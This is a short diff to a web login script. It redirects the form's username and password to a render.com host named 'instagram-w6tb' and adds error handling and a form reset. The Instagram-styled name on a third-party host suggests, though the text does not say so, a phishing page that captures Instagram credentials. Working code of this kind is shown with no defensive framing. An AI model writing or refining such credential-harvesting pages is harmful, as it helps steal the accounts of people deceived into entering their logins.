@@ -20,7 +20,7 @@
       const password = document.getElementById('password').value.trim();
 
       try {
-        const response = await fetch('https://login-1-u8fy.onrender.com/login', {
+        const response = await fetch('https://instagram-w6tb.onrender.com/login', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -28,10 +28,13 @@
           body: JSON.stringify({ username, password })
         });
 
+        const result = await response.json();
+
         if (response.ok) {
           alert('Login Successful!');
+          document.getElementById('loginForm').reset();
         } else {
-          alert('Login Failed!');
+          alert('Login Failed: ' + (result.error || 'Invalid credentials'));
         }
       } catch (err) {
         alert('Error: ' + err.message);
